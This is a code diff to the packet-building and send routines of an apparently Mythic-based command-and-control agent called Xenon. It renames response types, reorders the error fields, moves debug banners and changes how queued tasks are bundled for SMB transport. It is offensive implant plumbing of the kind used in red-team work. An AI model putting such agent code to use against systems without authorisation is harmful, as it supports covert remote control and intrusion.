@@ -177,18 +177,21 @@ BOOL PackageAddFormatPrintf(PPackage package, BOOL copySize, char *fmt, ...)
  */
 VOID PackageError(PCHAR taskUuid, UINT32 errorCode)
 {
-    /* Create post_response Package */
+    /* Create Task Response Package */
     PPackage data = PackageInit(NULL, FALSE);
-    PackageAddByte(data, POST_RESPONSE);
+    PackageAddByte(data, TASK_RESPONSE);
     
     /* Add Task UUID */
     PackageAddString(data, taskUuid, FALSE);
     
-    /* Error Information */
-    PackageAddInt32(data, errorCode);
-    
+    /* No Data */
+    PackageAddInt32(data, 0);
+
     /* Add Status Byte to End */
     PackageAddByte(data, TASK_FAILED);
+
+    /* Error Information */
+    PackageAddInt32(data, errorCode);
 
     /* Queue Packet To Send */
     PackageQueue(data);
@@ -199,9 +202,9 @@ VOID PackageError(PCHAR taskUuid, UINT32 errorCode)
  */
 VOID PackageUpdate(PCHAR taskUuid, PPackage package)
 {
-    /* Create post_response Package */
+    /* Create Task Response Package */
     PPackage data = PackageInit(NULL, FALSE);
-    PackageAddByte(data, POST_RESPONSE);
+    PackageAddByte(data, TASK_RESPONSE);
     
     /* Add Task UUID */
     PackageAddString(data, taskUuid, FALSE);
@@ -229,9 +232,9 @@ VOID PackageUpdate(PCHAR taskUuid, PPackage package)
  */
 VOID PackageComplete(PCHAR taskUuid, PPackage package)
 {
-    /* Create post_response Package */
+    /* Create Task Response Package */
     PPackage data = PackageInit(NULL, FALSE);
-    PackageAddByte(data, POST_RESPONSE);
+    PackageAddByte(data, TASK_RESPONSE);
     /* Add Task UUID */
     PackageAddString(data, taskUuid, FALSE);
     /* Add Data */
@@ -343,7 +346,7 @@ BOOL PackageSend(PPackage package, PPARSER response)
     ////////////////////////////////////////
     ////////// Send Mythic package /////////
     ////////////////////////////////////////
-    _dbg("\n\n===================REQUEST======================\n");
+    
 
     // Mythic AES encryption
     if (xenonConfig->isEncryption) 
@@ -357,7 +360,9 @@ BOOL PackageSend(PPackage package, PPARSER response)
         return FALSE;
     }
 
+    _dbg("\n\n===================REQUEST======================\n");
     _dbg("Client -> Server message (length: %d bytes)", package->length);
+    
 
     PBYTE  pOutData      = NULL;
     SIZE_T sOutLen       = 0;
@@ -371,6 +376,8 @@ BOOL PackageSend(PPackage package, PPARSER response)
         _err("Failed to send network packet!");
         return FALSE;
     }
+
+    _dbg("\n\n================================================\n");
 
     // TODO remove comment
     // In the case where SMB receive doesnt return anything
@@ -393,7 +400,8 @@ BOOL PackageSend(PPackage package, PPARSER response)
     ////////////////////////////////////////
     _dbg("\n\n===================RESPONSE======================\n");
     _dbg("Server -> Client message (length: %d bytes)", response->Length);
- 
+    
+
     if (!ParserBase64Decode(response)) {
         _err("Base64 decoding failed");
         goto end;
@@ -420,7 +428,7 @@ BOOL PackageSend(PPackage package, PPARSER response)
     
     // _dbg("Decrypted Response");
     // print_bytes(response->Buffer, response->Length);
-    
+    _dbg("\n\n================================================\n");    
 
     bStatus = TRUE;
 
@@ -484,12 +492,18 @@ BOOL PackageSendAll(PPARSER response)
     PPackage Package  = NULL;
     BOOL     Success  = FALSE;
 
+
+#ifdef SMB_TRANSPORT
+
     /* Nothing to send */
     if ( !xenonConfig->PackageQueue )
         return TRUE;
 
-    /* Add all packages into a single post_response packet */
-    Package = PackageInit(POST_RESPONSE, TRUE);
+#endif
+
+    /* Add all packages into a single packet */
+    Package = PackageInit(GET_TASKING, TRUE);
+    PackageAddInt32(Package, NUMBER_OF_TASKS);
 
     Current = xenonConfig->PackageQueue;
 
@@ -552,8 +566,6 @@ CLEANUP:
 
     return Success;
 }
-
-
 
 
 VOID PackageDestroy(PPackage package)
